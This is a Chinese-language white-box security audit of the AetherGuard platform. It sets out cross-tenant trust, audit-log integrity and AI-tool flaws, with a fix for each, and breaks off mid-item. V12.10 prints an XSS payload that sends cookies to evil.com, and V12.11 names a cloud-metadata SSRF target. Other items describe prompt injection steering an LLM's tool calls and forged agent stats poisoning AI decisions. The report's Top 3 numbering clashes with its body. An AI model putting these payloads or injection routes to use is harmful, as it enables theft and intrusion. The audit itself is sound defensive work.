# 跨服务信任边界白盒安全审计 - R12

**审计员**：AetherGuard Sprint 5 Wave 7 R12 跨服务信任边界白盒安全审计（只读）
**审计时间**：2026-06-06
**审计范围**：7 个跨 service 信任路径（Postgres shadow、Command dispatcher、AI tool executor、Audit segment/archive、Message bus、AgentGateway WebSocket、Final defense state）
**威胁模型**：
- Service A 信任 Service B 输出的安全性：A 的安全依赖于 B 没有出错 / 没有被攻击
- 跨进程 / 跨存储 / 跨网络边界：SQLite ↔ Postgres ↔ S3 ↔ 设备 agent ↔ AI 决策引擎
- 攻击者可能是：受控 agent、被攻破的 Postgres 凭据、被劫持的 LLM、被篡改的 audit log

---

## 摘要

| 类别 | 漏洞数 | 严重度分布 |
|------|--------|------------|
| 1. Postgres shadow 写路径 | 5 | 2C / 2H / 1M |
| 2. Command dispatcher race | 4 | 1C / 2H / 1M |
| 3. AI tool executor trust | 4 | 1C / 1H / 2M |
| 4. Audit segment / archive | 4 | 2C / 1H / 1M |
| 5. Message bus (AI agents) | 3 | 0C / 2H / 1M |
| 6. WebSocket 跨层信任 | 4 | 2C / 1H / 1M |
| 7. Final-defense state mutation | 3 | 1C / 2H |
| **合计** | **27** | **8C / 9H / 7M / 3L** |

> 整个系统把"audit log 必须可信"作为最终防线（Final Defense）的根信任之一，但 audit log 写入路径本身存在 **fire-and-forget 异步写 shadow store**（`audit-logger.service.ts:252`）+ **shadow 写失败被静默吞掉**（`postgres-shadow-store.service.ts:927-930`）—— 攻击者破坏 Postgres 凭据后，可以在主 SQLite 留下任意 audit 记录，shadow 中不存在，导致合规审计 / 司法取证时"没有这条记录"。

---

## Top 3 最危险

1. **V12.7 — Command dispatcher 信任 agent 回调中的 `tenantId`**（`command-dispatcher.service.ts:1022-1043, 1045-1066`）—— `handleAgentCommandAck` / `handleAgentCommandFailure` 直接从 agent payload `data.tenantId` 读出 tenant_id（仅在缺失时回退到 `'global'`），完全没有与 `socket.data.agent.tenantId` 校验。攻击者控制的 agent 可以伪造其他 tenant 的 `actionId` 的 ack，污染 `sec_actions` 状态、绕过 audit log 的归属完整性。  
2. **V12.11 — `agent:traffic_stats` 完全无签名，污染 AI 决策依据**（`agent-gateway.ts:629-688`）—— `globalStats.packetsProcessed` / `packetsBlocked` 等计数器是 AI 多 agent 决策的关键输入，但 `probeStats` 没有任何 HMAC / 签名校验。已知凭证的 agent（或被劫持的 agent）可以发送"虚假高流量" → AI 决策系统判定"安全态势严重" → 触发高风险 response（firewall rule、isolate）—— 这是 AI 输入投毒的标准路径。  
3. **V12.1 — Audit log 写 SQLite + 写 Postgres shadow 非原子**（`audit-logger.service.ts:183-269`）—— 同一个 `auditLogger.log()` 调用里：(a) `canServeReads` 走 Postgres `execute()` (await) → (b) 写本地 SQLite (sync) → (c) `void postgresShadowStoreService.upsert('audit_log', ...)` (fire-and-forget)。Postgres shadow 写失败被 `upsert` 内部 catch（`postgres-shadow-store.service.ts:927-930` 只 `logger.warn`）—— 一条 audit 记录可能在主库存在但 shadow 不存在。下一次 `getLogsView()` 走 shadow 路径时返回的 audit log 集合不一致，触发合规问题 / 给攻击者创建"未审计操作"窗口。

---

## 1. Postgres shadow 写路径（数据一致性 / 跨存储 trust）

### V12.1: Audit log 写 SQLite + 写 Postgres shadow 非原子，shadow 失败被静默吞
- **类型**: cross-service trust + data inconsistency
- **文件:行号**:
  - `backend/src/security/audit-logger.service.ts:183-269` —— `log()` 主流程：先 `await postgresShadowStoreService.execute(...)`（仅当 `canServeReads`），再 `db.prepare(...).run(...)` 写本地 SQLite，最后 `void postgresShadowStoreService.upsert('audit_log', ...)` fire-and-forget
  - `backend/src/services/postgres-shadow-store.service.ts:923-930` —— `upsert()` 内部 `try { ... } catch { this.connected = false; this.lastError = ...; logger.warn('Postgres shadow write failed', ...) }`—— 错误被吞，没有 throw，没有 re-throw
- **攻击场景**:
  1. 攻击者拿到 Postgres shadow 凭据（`SHADOW_DATABASE_URL`）的写权限（通过漏洞、偷凭据、离职员工）
  2. 把 Postgres 中的 `audit_log` 表某关键记录 delete
  3. 本地 SQLite 仍然保留完整 audit
  4. 调用方 `getLogsView()` 走 `canServeReads()` true 路径 → 读到影子库的不完整记录集
  5. 同时主 SQLite 仍有完整记录，但所有审计导出、合规报告、admin UI 都优先从 shadow 读 → "记录消失"
  6. 进一步：fire-and-forget `void postgresShadowStoreService.upsert(...)` 没有任何 caller 等待，所以即使 shadow 一开始就 unreachable，shadow 写入失败也是不可观察的（`upsert` 内部只 `logger.warn`）
- **影响**:
  - 合规审计失效：审计员拿到的影子库 audit log 不完整
  - 内部归因失效：发生入侵时无法证明"在 X 时刻 Y 租户执行了 Z 操作"
  - 攻击者擦除特定 audit 记录后，触发连锁：Final Defense 的 chain 校验会发现 hash 链断裂 → 标记 segment 为 `corrupt` → 但因为缺失数据本身无法恢复
- **修复建议**:
  - 写 audit log 时使用 outbox pattern：先写本地 SQLite（source of truth），再写入 Postgres 的同一事务中（两阶段提交或逻辑 outbox + 异步重试 + 失败告警）
  - 或者：把 shadow 写失败从 `logger.warn` 升级为抛错，让 `audit-logger.log()` 知道失败，并写入本地 `audit_shadow_failures` 表（运营监控会注意到）
  - 写完后必须做"双写校验"：写完 shadow 后立刻 `SELECT COUNT(*)` 验证

### V12.2: `backfillSnapshot()` 走 `DELETE` + 逐行 upsert，全表清空窗口
- **类型**: data inconsistency + window of partial data
- **文件:行号**:
  - `backend/src/services/postgres-shadow-store.service.ts:852-884` —— `backfillSnapshot` 在每个 `backfill: 'replace'` 表上先 `await this.pool!.query(\`DELETE FROM "${table}"\`)`，然后对 SQLite 中的每行 `await this.upsert(table, row)`
  - `resyncIntervalMs` 默认 60 秒（`SHADOW_DB_RESYNC_INTERVAL_MS`），可低至 10 秒
- **攻击场景**:
  1. 攻击者破坏了 Postgres shadow 凭据读权限（或者 Postgres 实例临时不可达）→ `canServeReads` 返回 true 但 `queryAll` 抛错
  2. 60 秒后 `resyncTimer` 触发 `backfillSnapshot()` → DELETE 成功（因为 DELETE 凭据在 service init 时已绑定），UPSERT 成功（因为读 SQLite 正常）
  3. 中间 60s 窗口内，shadow 表中所有表都被清空，读路径全空
  4. 触发 `getLogsView()`、`listSegments()` 等走 shadow 的所有 API 短时返回空 → 误判"无事件" → UI 隐藏告警
- **影响**:
  - 60 秒 × 35 张表 = 全影子库清空窗口，绕过告警
  - 如果 resyncIntervalMs 调到 10s（env var 允许），窗口缩到 10s 但更频繁
- **修复建议**:
  - `backfillSnapshot` 改用 staging table：先 `CREATE TABLE ..._staging`，upsert 到 staging，再 `ALTER TABLE ... RENAME TO ..._old; ALTER TABLE ..._staging RENAME TO ...`（PG 原子 rename）
  - 失败时回滚 staging，保留旧表
  - 或者：使用 `INSERT ... ON CONFLICT ... DO UPDATE` + `TRUNCATE` 包裹在 transaction 中

### V12.3: shadow 写路径不验证 `tenant_id` 一致性，跨租户数据可注入
- **类型**: cross-tenant trust
- **文件:行号**:
  - `backend/src/services/postgres-shadow-store.service.ts:897-932` —— `upsert(table, row)` 直接 `await this.pool!.query(sql, values)`，不检查 `row.tenant_id` 是否与调用方一致
  - 调用方举例：`security-operations.service.ts:332` `void postgresShadowStoreService.upsert(table, row)`；`admin.repository.ts:107` 同样
- **攻击场景**:
  1. 攻击者拿到任意一个"低权限" service 调用 shadow 的能力（例如通过 XSS 触发 admin 写入）
  2. 调用 `void postgresShadowStoreService.upsert('audit_log', { id: 'fake', tenant_id: 'TARGET_TENANT', event_type: 'host_remove', action: '...', ... })` 即可在 shadow 中植入"另一租户执行了 host_remove" 的虚假记录
  3. 后续 `getLogsView({ tenantId: 'TARGET_TENANT' })` 读出来 → 误导运维 / 触发 Final Defense 警报
  4. 因为 shadow 与主 SQLite 是异步解耦的，SQLite 不会有这条虚假记录，但影子库 read 路径返回它
- **影响**:
  - 跨租户虚假 audit 记录注入
  - 合规取证被污染
  - 攻击者可以"制造"任意租户的恶意操作历史
- **修复建议**:
  - `upsert()` 接口签名加入 `expectedTenantId: string` 参数，与 `row.tenant_id` 强制一致
  - 或者：在 `postgres-shadow-store.service.ts` 内部做"row-level tenant scope" 检查（基于调用上下文，例如 `request.tenant`），不匹配就抛错

### V12.4: shadow `execute()` 使用 raw SQL 字面拼接 `$N`，prepared statement 不一致
- **类型**: SQL injection (low risk, prepared statements 部分覆盖)
- **文件:行号**:
  - `backend/src/services/postgres-shadow-store.service.ts:897-921` —— `upsert` 用 `$1, $2, ...` 占位符（pg Pool.query 内部是 prepared）
  - `backend/src/services/postgres-shadow-store.service.ts:957-973` —— `execute(sql, params)` 把 `params.map(value => toQueryValue(value))` 后传给 `this.pool!.query(sql, params)`，仍然是 pg 客户端层 prepared
  - 风险点：`audit-segment.service.ts:428-464` 直接传 raw SQL 字符串到 `execute()`，如果有人 review 时改成字符串拼接，pg client 不会二次 escape
- **攻击场景**:
  - 当前没有发现可达 SQL injection（所有调用都走 `?` 或 `$N` 占位符）
  - 但：`audit-archive.service.ts:218-234` `inspectObject(bucket, objectKey, versionId?)` 没有 SQL，是 S3 HeadObject
- **影响**: 暂无可达漏洞，但 API 设计缺乏类型约束 → 未来 review error 时可能引入
- **修复建议**:
  - `execute()` 改为白名单 SQL 模板（类似 `queryAll`）
  - 或者：把 `execute()` 改名 `executeRaw()` 并加 lint rule 禁止传 raw template

### V12.5: `audit_segment.persistSegment()` 双写顺序错误，shadow 与 sqlite 在不同路径
- **类型**: data inconsistency
- **文件:行号**:
  - `backend/src/services/audit-segment.service.ts:427-490` —— `persistSegment`：
    - 当 `canServeReads() === true`：`await postgresShadowStoreService.execute(...)` 写 shadow
    - 然后写本地 SQLite `db.prepare(...).run(...)`
    - 然后 `if (!canServeReads())` 才 `void postgresShadowStoreService.upsert('audit_segments', ...)` fire-and-forget
  - **bug**：当 `canServeReads` 为 true 时，shadow 已经写过，但 fire-and-forget upsert 不会触发（条件 `!canServeReads`），但 `execute()` 内部走 `pool.query` 不是走 upsert 接口——OK 没问题
  - **真正的 bug**：当 `canServeReads` 在 `execute()` 调用后变为 false（连接抖动），`upsert` 不会被调用，shadow 中有数据但 SQLite 没有 → 不一致窗口
- **攻击场景**:
  1. Postgres 抖动，`canServeReads` 在某次 `execute()` 之后变 false
  2. `execute()` 已成功写 shadow，但 SQLite 那一句 `INSERT OR REPLACE` 抛错（例如表被 lock）
  3. `if (!canServeReads())` 命中 → 触发 fire-and-forget `upsert('audit_segments', ...)`
  4. 实际效果：shadow 有 segment，SQLite 没有 → `getLatestSegment` 走 SQLite 路径返回 null → chain 链断裂
- **影响**: audit chain 可能出现 "shadow 中存在但本地不存在" 的孤儿子 segment
- **修复建议**:
  - 写顺序改为：先写本地 SQLite（成功后才继续）→ 再尝试写 shadow（失败时记录到 `shadow_write_failures` 表）
  - 或者：使用 transactional outbox：本地 SQLite 包含 outbox 表，周期性 worker 把 outbox 中的记录 flush 到 shadow

---

## 2. Command dispatcher race（跨 process 决策时序）

### V12.6: `dispatchAgentCommand` / `dispatchDeviceCommand` 间无原子性，TOCTOU 窗口
- **类型**: cross-service race
- **文件:行号**:
  - `backend/src/services/command-dispatcher.service.ts:435-720` —— `dispatchAgentCommand` 和 `dispatchDeviceCommand` 流程：
    1. `reviewCommandForClassification(...)` (await)
    2. `requestHardwareConfirmation(...)` (await, 可能挂起数分钟等物理确认)
    3. `executeAgentCommand` / `executeDeviceCommand` (await)
  - 步骤 2 与 3 之间，`input.agentId` / `input.deviceId` 没有任何重新校验 tenant / 状态
  - `input.actor` 是 API 请求时传入的，如果这是由其他 service 转发（不是 HTTP 入口），`input.actor.tenantId` 可能 stale
- **攻击场景**:
  1. 攻击者 T0 时刻以 tenant A 身份发起 dispatch request
  2. system 进入 `requestHardwareConfirmation`（等待物理按钮，分钟级）
  3. 运维 / 攻击者在 T1 时刻把 `agents` 表中 agent 的 `tenant_id` 改为 tenant B（通过 admin API 改）
  4. 物理按钮被按下后 T2 时刻 `dispatchHardwareConfirmedIntent` 触发
  5. `executeAgentCommand` 调用 `this.agentGateway.sendCommandToAgent(input.agentId, ...)`，agent 仍以 tenant A 的 socket 接收命令
  6. tenant B 的设备 agent 执行了 tenant A 的命令 → 跨租户命令执行
  7. 类似：`tenantId` 是从 `intent.tenantId` 拿的（line 762），不是从 agent 的 socket 拿的 → 跨租户攻击面放大
- **影响**:
  - 跨租户命令执行：tenant A 通过硬件确认 gate 把命令 dispatch 到 agent，agent 的 tenant 已被改到 B
  - audit log 上 "actor 是 tenant A"，但实际被操作的是 tenant B 的资源
- **修复建议**:
  - 在 `executeAgentCommand` / `executeDeviceCommand` 入口处重新从 DB 拉取 `agent.tenant_id` / `device.tenant_id`，与 `input.actor.tenantId` 比对，不匹配就拒绝
  - `dispatchHardwareConfirmedIntent` 重新从 `agentAuthService.getAgent(intent.targetId).tenantId` 验证
  - 引入 monotonic version 锁：dispatch 决策时记录 `expected_agent_version`，execute 时再校验

### V12.7: `handleAgentCommandAck` / `handleAgentCommandFailure` 信任 agent payload 的 `tenantId`
- **类型**: cross-service trust violation (CRITICAL)
- **文件:行号**:
  - `backend/src/services/command-dispatcher.service.ts:1022-1043` —— `handleAgentCommandAck`：
    ```
    const tenantId = String(data?.tenantId || 'global');
    const actionId = String(data?.actionId || '').trim();
    ...
    this.safeUpdateActionRun({ tenantId, actionId, status: 'completed', ... });
    ```
  - `backend/src/services/command-dispatcher.service.ts:1045-1066` —— `handleAgentCommandFailure` 同样
  - `backend/src/websocket/agent-gateway.ts:840-882` —— WebSocket handler 把 `data` 直接 `commandDispatcherService.handleAgentCommandAck(agent.agentId, data || {})`，没有把 `socket.data.agent.tenantId` 传过去；只校验 `agent.agentId`
- **攻击场景**:
  1. 攻击者控制一个 agent（合法凭证连接到 platform，tenant A）
  2. 通过 `agent:command_ack` WebSocket 事件发送 `{ actionId: 'TARGET-ACTION-UUID', tenantId: 'TARGET_TENANT_B', message: 'success' }`
  3. `commandDispatcherService.handleAgentCommandAck` 提取 `tenantId: 'TARGET_TENANT_B'`，调用 `securityOperationsService.updateActionRun({ tenantId: 'TARGET_TENANT_B', actionId: 'TARGET-ACTION-UUID', status: 'completed' })`
  4. `sec_actions` 表中 `TARGET_TENANT_B` 的对应 action 被标记为 `completed` —— 实际上这个 action 可能是为 B 的真实用户派发的高风险操作，攻击者伪造它的 ack
  5. 同步：audit log 也被 broadcast 为 `agent:command:ack` 到所有 dashboard 客户端，UI 误判
  6. 这个 ack 还会进 `securityOperationsService.recordActionRun` 的 runLog，所以还会出现"完成"日志，绕开"failure"应有的告警链路
- **影响**:
  - **跨租户伪造 action 完成**——影响 Final Defense 状态机：`sec_actions` 状态污染
  - 如果 action 关联到 "host_remove" / "wipe_data" 等 root-resistant 命令，被 ack 后 audit 显示完成但实际未执行（或反过来：未执行成功被伪造失败）
  - 平台运维 dashboard 出现"已完成的危险操作"误报
- **修复建议**:
  - 修改签名：`handleAgentCommandAck(agentId: string, agentTenantId: string, data)`，把 `socket.data.agent.tenantId` 从 WebSocket 层传下来
  - 在 `safeUpdateActionRun` 内部用 DB JOIN 校验 `actionId` 对应的 `tenant_id` 与传入的 `tenantId` 一致
  - 或者：完全忽略 `data.tenantId`，统一从 action record 反查 tenant

### V12.8: `dispatchHardwareConfirmedIntent` 复用了 stale `intent.tenantId`
- **类型**: cross-service race + stale context
- **文件:行号**:
  - `backend/src/services/command-dispatcher.service.ts:740-793` —— `dispatchHardwareConfirmedIntent`：
    ```
    const actor: CommandActor = {
      tenantId: intent.tenantId,   // 来自 intent，不是 agent socket
      userId: 'hardware-confirmation-gateway',
      email: intent.requestedBy,
      ip: `gate:${grant.gateId}`
    };
    const result = intent.scope === 'agent' ? executeAgentCommand({...}) : executeDeviceCommand({...});
    ```
  - intent 在 `requestHardwareConfirmation` 时记录，可能数十秒到数分钟前
- **攻击场景**:
  - 配合 V12.6：intent 时 tenant A 触发 → 期间 target agent 改到 tenant B → intent 的 `tenantId` 仍是 A → 实际命令到 B
  - `actor` 的 `tenantId` 完全是 stale value，没有重新校验
- **影响**: V12.6 攻击路径的延伸，跨租户命令执行更隐蔽
- **修复建议**:
  - 在 `executeAgentCommand` / `executeDeviceCommand` 内部重新查 DB 获取当前 agent/device tenant，与 intent 比对
  - 失败时把 intent 标记为 `orphaned` 并报警

### V12.9: `reviewCommandForClassification` 通过 LLM 决策后，物理确认 gate 被 bypass
- **类型**: cross-service trust (AI → hardware)
- **文件:行号**:
  - `backend/src/services/command-dispatcher.service.ts:186-283` —— `reviewCommandForClassification` 在 classificationLevel='maximum' 时直接 `allowed: true`（line 248-255），跳过物理确认
  - `backend/src/services/command-dispatcher.service.ts:501-509` / `664-672` —— 只有在 `riskClass === 'physical_confirmation_required'` 时才走 `requestHardwareConfirmation`
- **攻击场景**:
  1. 攻击者控制 admin 权限（拿到 `tenant_admin` 角色）
  2. 把 `platform_config.detection_pipeline.classificationLevel` 改为 `'maximum'`
  3. 此时所有 command 都进 `reviewCommandForClassification`，对 `physical_confirmation_required` 风险类的命令只 `allowed: true` 但 status 是 'completed'（line 257-264）→ 不再触发 `requestHardwareConfirmation`（因为 `review.allowed === true`）
  4. 实际上 `riskClass === 'physical_confirmation_required'` 的命令（如 `wipe_data`、`host_remove`）**完全跳过物理确认 gate**
- **影响**:
  - 一个 admin 通过简单改 config 就能把硬件确认 gate 完全 bypass
  - 配合 V12.6 跨租户执行，破坏 root-resistant final defense 的核心承诺
- **修复建议**:
  - `requestHardwareConfirmation` 的触发条件不能被 `review.allowed` 短路——`riskClass === 'physical_confirmation_required'` 必须强制进入 hardware gate，与 classificationLevel 无关
  - 把 `physical_confirmation_required` 的命令列入系统级白名单，绕开 classificationLevel 配置

---

## 3. AI agents tool executor（用户输入 → tool → AI → 用户）

### V12.10: tool 输出未做 XSS 防护，LLM 反射到用户界面
- **类型**: cross-service trust (tool output → LLM → user) + XSS risk
- **文件:行号**:
  - `backend/src/ai-agents/capabilities/tool-executor.ts:284-340` —— `executeDecodePayload` 把 `payload` 解码后的 `decoded` 直接返回到 `results[]`，调用方获得 `output.decodedVersions[i].decoded`
  - `backend/src/ai-agents/capabilities/tool-executor.ts:342-395` —— `executeAnalyzeHeaders` 把 header 名/值直接返回到 `output.issues[].header` / `recommendations[]`
  - `backend/src/ai-agents/capabilities/tool-executor.ts:397-464` —— `executeCheckPattern` 把 `match[0]` 直接返回到 `output.matches[].match`
  - 这三个 tool 都没有 `sanitizeForLLM` 或 `escapeHTML`，输出被 LLM 接收后 LLM 可能原样反射
- **攻击场景**:
  1. 攻击者构造恶意 request → LLM 调用 `decode_payload` 工具
  2. 工具解码出包含 `<script>document.location='http://evil.com/?c='+document.cookie</script>` 的 payload
  3. 工具返回 `{ decodedVersions: [{ decoded: '<script>...</script>' }] }`
  4. LLM 在回答时引用这个 decoded 内容（"解码结果如下：<script>..."）
  5. 如果前端用 `dangerouslySetInnerHTML` 渲染（即使是 markdown 渲染器 `react-markdown` 也可能受 `rehype-raw` 影响），XSS 触发
  6. 同理：`analyze_headers` 的 header 名字如果含 `<script>` 也会反射
- **影响**:
  - AI agent 的最终输出（chat / report）可以被 LLM 投毒后通过前端 XSS
  - tool chain（tool → LLM → user）是 prompt injection 的标准放大器
- **修复建议**:
  - tool output 增加 `sanitizedOutput: string` 字段，去除 `<`、`>`、`&`、控制字符
  - 或：在 tool output 中加 `__htmlSafe: true` 标记，让前端知道要 escape
  - 前端：禁止 `dangerouslySetInnerHTML`；markdown 渲染禁用 `rehype-raw`

### V12.11: `http_probe` 模拟而非真探测，但 URL validator 弱，可被 SSRF 探测利用
- **类型**: cross-service trust (URL → sandbox) + sandbox bypass
- **文件:行号**:
  - `backend/src/ai-agents/capabilities/tool-executor.ts:234-261` —— `executeHTTPProbe`：
    - 实际上**不会真发出 HTTP 请求**，返回 `status: 'simulated'`（line 250-260）
    - 但 `sanitizeURL` 接受任意 `http://` / `https://` URL
- **攻击场景**:
  - 当前没有真 SSRF 风险（`status: 'simulated'`）
  - 但如果未来有人去掉 `simulated` 标记改成真探测，`http_probe` 工具会接受 `http://169.254.169.254/latest/meta-data/`（AWS metadata）、`http://localhost:3005/api/...`（内网）
  - `sandbox.networkAccess: false` 默认值（line 24），但如果调用方传 `sandboxOptions: { enabled: true, networkAccess: true }` 就会绕过
- **影响**:
  - 当前是 latent risk；一旦 `http_probe` 实现为真探测，立即变成 SSRF
  - LLM 可以调 `http_probe({ url: 'http://169.254.169.254/' })` 探测云 metadata
- **修复建议**:
  - URL validator 强校验：拒绝 `169.254.0.0/16`、`127.0.0.0/8`、`::1`、RFC 1918 私有地址
  - 即使是模拟探测，也记录"探测目标"日志，方便审计 LLM 调用的目标
  - 永远把 `http_probe` 实现为"no real network" 模式

### V12.12: tool execution history 未限制大小，无清理 → memory 累积
- **类型**: DoS / resource exhaustion (cross-process state)
- **文件:行号**:
  - `backend/src/ai-agents/capabilities/tool-executor.ts:30, 149, 163` —— `executionHistory: Map<string, ToolExecutionResult>` 无界
  - `backend/src/ai-agents/capabilities/tool-executor.ts:499-504` —— `getExecutionHistory(requestId?)` 返回所有历史
- **攻击场景**:
  1. 攻击者通过 LLM 触发大量 tool 调用（每个 tool call 生成一个 UUID requestId）
  2. `executionHistory` Map 无限增长 → 内存泄漏
  3. `getExecutionHistory()` 不带参数返回整个 map → JSON 序列化超大 → 响应时间 DoS
- **影响**: process memory OOM / 响应 hang
- **修复建议**:
  - LRU cache 限制 `executionHistory` 大小（例：最多 1000 条）
  - `getExecutionHistory()` 强制要求 `requestId` 参数，不带时不返回全集

### V12.13: `validateParameters` 允许正则 source 在 user-supplied patterns 列表
- **类型**: cross-service trust (LLM → regex engine)
- **文件:行号**:
  - `backend/src/ai-agents/capabilities/tool-executor.ts:414-425` —— 用户 patterns 通过 `validateRegexPattern` 静态校验后编译为 RegExp
  - 已有 `REGEX_TIMEOUT_MS = 1000` 防护（line 17, 434）
  - 但 `userCompiled` 的 regex 在 `for` 循环中顺序执行（line 429-455），**没有全局 timeout**
- **攻击场景**:
  1. LLM 被 prompt injection 让它调 `check_pattern({ patterns: ['A', 'B', 'C', ... 1000 个] })`
  2. 每个 pattern 单个有 1s timeout，但 1000 个串行执行 = 1000s
  3. process 整个 event loop 被卡住（虽然有 `setTimeout` 标记 `timedOut` 但主循环仍 sync 等 `regex.exec`）
  4. 整个 process hang
- **影响**: event loop 长时间阻塞，所有 WebSocket / HTTP 响应延迟
- **修复建议**:
  - 全局 `total_timeout` 限制总耗时（例如 5s）
  - patterns 数量也限制（例如最多 20 个）
  - 串行改为 `Promise.race` / `worker_threads` 隔离

---

## 4. Audit segment / archive（segment 切换、S3 上传、fail-closed 行为）

### V12.14: `archivePending` 切 segment 时 S3 上传失败 → 主表数据未清理但 segment 标记不完整
- **类型**: cross-service trust (S3 ← Postgres) + data inconsistency
- **文件:行号**:
  - `backend/src/services/audit-segment.service.ts:513-628` —— `archivePending` 流程：
    1. `loadLogsForSegment` 读 SQLite 拿一批 audit_log
    2. `auditArchiveService.writeLockedJson(tenantId, 'audit/segments', segmentKey, payload)` 写 S3
    3. `persistSegment(row)` 写 segment 记录
    4. `verifySegment(segmentId)` 校验
  - `backend/src/services/audit-archive.service.ts:192-215` —— S3 写失败时：
    - `objectLockRequired` 为 true → 抛错
    - `objectLockRequired` 为 false → fallback 到本地 `audit-fallback/` 目录，`bucket: 'local-fallback'`
  - `archivePending` 收到 fallback 结果后仍然 `persistSegment(row)`（line 604）
  - **问题**：`verifySegment` 走 `if (segment.metadata.bucket && segment.metadata.objectKey && segment.metadata.bucket !== 'local-fallback')` 分支（line 646-665）—— local-fallback 走的是 `artifactStoreService.readJson`，但 `auditArchiveService.writeLockedJson` 的 fallback 路径返回 `bucket: 'local-fallback'`、`objectKey` 是 `${safeScope}/${safeKey}` —— **没有 `artifactRef` / `artifactLocation` 字段**（line 208-214），所以 `verifySegment` 中 `artifactStoreService.readJson(segment.metadata.artifactRef || segment.objectKey || '', segment.metadata.artifactLocation || undefined)` 会失败（artifactRef 为空字符串）
- **攻击场景**:
  1. 配置 `auditArchive.objectLockRequired: false`
  2. 攻击者破坏 S3 凭据 / S3 临时不可达
  3. `archivePending` 触发 → S3 写失败 → fallback 到本地
  4. `verifySegment` 失败 → 标记 `verifyStatus: 'corrupt'`
  5. 但 audit_log 中这些记录已"被读过"参与 contentHash 计算 → 不会再被读（因为 `loadLogsForSegment` 用 `previousSegment.metadata.lastTimestamp` 作为 after 过滤）
  6. 结果：audit 记录链断裂，verifyStatus='corrupt' 但无重建路径
- **影响**:
  - 长期 S3 故障 → 全部 segment 走 local-fallback → 全部被 verifySegment 标 corrupt
  - 攻击者故意制造 S3 不可达来触发
- **修复建议**:
  - `writeLockedJson` fallback 路径补充 `artifactRef` / `artifactLocation` 字段（指向本地路径）
  - `verifySegment` 增加 `bucket === 'local-fallback'` 分支处理
  - fallback 仅作临时，添加监控告警

### V12.15: `archivePending` 切 segment 的 read-after-write 顺序问题
- **类型**: cross-service race + segment boundary
- **文件:行号**:
  - `backend/src/services/audit-segment.service.ts:521-620` —— 循环：
    1. `previousSegment = getLatestSegment(tenantId)` (line 526)
    2. `rows = loadLogsForSegment(tenantId, before, maxLogsPerSegment, after)` (line 535)
    3. 计算 chainHash 并写 S3
    4. `persistSegment` 写 segment
    5. `verifySegment` 校验
    6. `previousSegment = verification.segment || ...` (line 606)
    7. 继续下一批
  - **bug**：`before` 是函数入口时固定的 `options.before || new Date().toISOString()`（line 515），但循环体内不更新
  - 当一个 tenant 一次性产生 5+ 段（`maxSegments: 5`）时，所有段都用同一个 `before` 截止
  - `loadLogsForSegment` 用 `after`（previous segment 的 lastTimestamp+id）递增游标 —— OK
  - 但如果 `auditLogger.log()` 在 `archivePending` 期间继续工作，新写入的 audit_log 满足 `timestamp <= before`，会被纳入当前 segment
  - **race**：新 audit 事件被 segment A 写完后，新 segment B 出现但 A 的 `lastTimestamp` 已被新事件推后 → A 的 chainHash 改变？  
    答：不会，因为 `loadLogsForSegment` 是在 segment 写入前读的快照；但 `rows[rows.length-1].timestamp` 是 segment A 实际包含的最后一条
- **攻击场景**:
  1. 攻击者快速连续触发大量 audit 事件（`auditLogger.log()` 多次）
  2. `archivePending` 在 T0 启动，before=T0
  3. 攻击者在 T0+1ms 写入事件 E1（timestamp=T0+1ms）
  4. `loadLogsForSegment` 第一次执行时 T0+1ms 还未发生 → 读了 [T0-100ms, T0] 的事件
  5. 但因为 `before=T0`，第二次 `loadLogsForSegment` 用 after 过滤会跳过 T0 之前
  6. **真正的 race**：`before` 是固定的，攻击者事件 E1 在 first segment 之后 → 不被 first segment 包含
  7. 但是 E1.timestamp < before（T0+1ms < T0? 不，T0+1ms > T0）—— E1 不会被 first segment 包含（OK）
  8. **但**：在 segment 持久化时（line 604），E1 已经写了 SQLite。下一轮 `loadLogsForSegment` 用 first segment 的 `lastTimestamp` 过滤，会读到 E1（因为 E1.timestamp > first.lastTimestamp）
  9. 结果：E1 在 second segment 中，OK
- **影响**: 当前逻辑正确（虽然不完美），但**`before` 应该在循环内递增以避免大 tenant 一次性 segment 不足**
- **修复建议**:
  - `before` 在每次 segment 写入后更新为 `previousSegment.metadata.lastTimestamp`
  - 或者：`loadLogsForSegment` 中间用 transaction 锁 SQLite（`BEGIN IMMEDIATE`）

### V12.16: S3 凭据来自 env var 且无 KMS 加密，落盘备份到 config 风险
- **类型**: cross-service trust + secret management
- **文件:行号**:
  - `backend/src/services/audit-archive.service.ts:68-86` —— `getClient()`：
    ```
    const accessKeyId = String(process.env.S3_ACCESS_KEY || '').trim();
    const secretAccessKey = String(process.env.S3_SECRET_KEY || '').trim();
    ...
    this.client = new S3Client({...credentials: { accessKeyId, secretAccessKey } });
    ```
  - `endpoint` 也是 raw env var
  - 配置缺失时 `throw new Error('backend.audit_archive_s3_configuration_incomplete')`
  - 但一旦配置好，凭据在 process 内存中常驻
- **攻击场景**:
  1. 攻击者拿到 RCE / memory dump（其他漏洞导致）→ 直接读 `process.env.S3_*`
  2. 用 S3 凭据读所有 audit archive（合规数据外泄）
  3. 用 S3 凭据写 S3 桶内的任意 object（绕过 audit log 仅追加的设计）
- **影响**:
  - 凭据泄露 → 攻击者可以删/改 S3 上的 audit archive
  - 即便 object lock 启用，攻击者可以再上传一个错误版本（versioning 启用但恶意版本仍存在）
  - bucket lifecycle / replication 策略可被攻击者读出
- **修复建议**:
  - 使用 IAM role（`AWS_WEB_IDENTITY_TOKEN_FILE`）或 AWS SDK 的 `fromNodeProviderChain()` 拿临时凭据
  - 凭据禁止落盘（已在 env，OK，但禁止 `export` 到 `/proc/1/environ`）
  - audit-archive bucket 启用 Object Lock COMPLIANCE 模式（已有 `objectLockRequired` 配置）
  - 监控：S3 bucket policy 拒绝非 `app-server` IAM role 的写操作

### V12.17: `archivePending` 失败时 audit_log 不清理，shadow 端 segment 链路有"未归档"孤儿
- **类型**: cross-service data consistency
- **文件:行号**:
  - `backend/src/services/audit-segment.service.ts:513-628` —— 异常路径：
    - `loadLogsForSegment` 抛错 → 整个 `archivePending` 失败
    - `auditArchiveService.writeLockedJson` 抛错（`objectLockRequired` 为 true）→ 整个 `archivePending` 失败
    - `persistSegment` 抛错（SQLite 锁、shadow 故障）→ 整个 `archivePending` 失败
  - 所有失败路径中：audit_log 表**未删除任何记录**，segment 也未持久化
  - 下次 `archivePending` 会重试 → 重新 load 同样 records（OK，幂等）
  - **但**：`auditLogger.rotateLogs()`（`audit-logger.service.ts:803-892`）如果到了 retention 时间，删除 audit_log 中旧记录——这些记录可能未归档
- **攻击场景**:
  1. 攻击者故意制造 S3 不可达
  2. `archivePending` 失败 → audit_log 中旧记录不断累积
